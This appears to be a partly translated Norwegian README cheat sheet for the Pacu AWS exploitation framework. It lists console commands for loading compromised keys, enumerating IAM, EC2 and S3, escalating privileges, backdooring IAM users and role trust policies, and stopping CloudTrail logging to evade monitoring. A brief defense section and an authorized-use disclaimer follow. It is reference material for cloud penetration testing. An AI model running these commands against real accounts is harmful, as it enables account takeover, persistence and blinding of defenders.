<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Cloud Security">
</p>

<p align="center">
  <b>☁️ AWS-utnyttelsesrammeverket med åpen kildekode designet for penetrasjonstesting av skymiljøer, rettighetseskalering, innhenting av legitimasjon og rekognosering av infrastruktur</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og arkitektur](#-oversikt--arkitektur)
- [Installasjon](#-installasjon)
– [Session Management & AWS Key Import](#-session-management--aws-key-import)
  – [Importing Compromised Credentials](#importing-compromised-credentials)
  - [Antatte roller og økttokens](#assumed-rolles-and-session-tokens)
- [Rekognoserings- og opptellingsmoduler](#-rekognosering--opptellingsmoduler)
  - [Enumerating Current IAM Permissions](#enumerating-current-iam-permissions)
  - [Skanning av EC2-forekomster og S3-bøtter](#scanning-ec2-instances--s3-buckets)
- [Privilege Escalation Techniques in AWS](#-privilege-escalation-techniques-in-aws)
  - [Automatic Privilege Escalation Scanner](#automatic-privilege-escalation-scanner)
  - [Utfører eskaleringsmoduler](#executing-escalation-modules)
- [Persistence & Defense Evasion](#-persistence--defense-evasion)
  - [Backdooring IAM-roller og brukere](#backdooring-iam-roles--users)
  - [Disrupting CloudTrail Logging](#disrupting-cloudtrail-logging)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Detection](#-defensive-considerations--detection)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og arkitektur

Laget av **Rhino Security Labs**, **Pacu** er "Metasploit for AWS". Den er designet for å etterligne motstandstaktikk i Amazon Web Services-miljøer.

Pacu opererer ved å bruke en lokal SQLite-database som opprettholder tilstanden på tvers av støtende økter:
- **Modular pipeline:** Over 40 spesialiserte moduler som dekker oppdagelse, sideveis bevegelse, privilegieeskalering, utholdenhet og eksfiltrering.
- **Tillatelsesoppregning:** Analyserer IAM-policyer uten å utløse varselterskler ved å teste API-handlinger eller gjennomgå vedlagte administrerte retningslinjer.
- **Privesc Automation:** Evaluerer kjente IAM-tillatelseseskaleringsbaner (som `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Installasjon
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Session Management & AWS Key Import

Når Pacu starter, går du inn i en interaktiv konsoll. Opprett eller velg en økt:
```text
Pacu > set_session client_assessment
```
### Importerer kompromittert legitimasjon
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Antatte roller og økttokens
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Rekognoserings- og oppregningsmoduler

### Oppregning av gjeldende IAM-tillatelser
Bestem hvem du er og hva den aktive legitimasjonen har tillatelse til å gjøre:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Skanner EC2-forekomster og S3-bøtter
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Privilege-eskaleringsteknikker i AWS

Eskalering av AWS-privilegier er avhengig av feilkonfigurerte IAM-policyer som tillater ikke-administrative brukere å gi seg selv eller andre enheter administrative rettigheter.

### Automatisk Privilege Escalation Scanner
Skanner dine oppregnede tillatelser mot 21+ dokumenterte AWS privesc-vektorer:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Eksempelutdata fremhever sårbare tillatelser som `iam:PutUserPolicy`, `iam:AttachUserPolicy` eller `iam:CreateAccessKey`.*

### Utfører eskaleringsmoduler
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Utholdenhet og forsvarsunndragelse

### Backdooring IAM-roller og brukere
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Forstyrrer CloudTrail-logging
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Hurtigreferansetabell

| Mål | Pacu Command |
|--------|-------------|
| **Angi/velg økt** | `set_session <NAME>` |
| **Importer AWS-legitimasjon** | `set_keys` |
| **Vis gjeldende identitet** | `whoami` |
| **Oppreg IAM-rettigheter** | `run iam__enum_permissions` |
| **Skann etter Privesc-vektorer** | `run iam__privesc_scan` |
| **Ta opp S3-bøtter** | `run s3__enum` |
| **Regn opp EC2-forekomster** | `run ec2__enum` |
| **Disrupt CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Liste tilgjengelige moduler** | `list` |

---

## 🛡️ Defensive vurderinger og gjenkjenning

1. **GuardDuty & CloudTrail-overvåking:** Pacus automatiserte rettighetseskalering og tillatelsesskanning genererer raske sekvensielle API-spørringer som enkelt kan flagges av AWS GuardDuty.
2. **SCP- og tillatelsesgrenser:** Håndhev AWS Organizations Service Control Policies (SCPs) som hindrer enhver oppdragsgiver – inkludert fullstendige administratorer – fra å tukle med CloudTrail eller endre rotorganisasjonsstrukturer.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Pacu er designet spesielt for autoriserte AWS-penetrasjonstester og sikkerhetsevalueringer. Testing av skykontoer uten eksplisitt forhåndstillatelse fra eieren av eiendelen bryter Amazons retningslinjer for akseptabel bruk og internasjonal lov.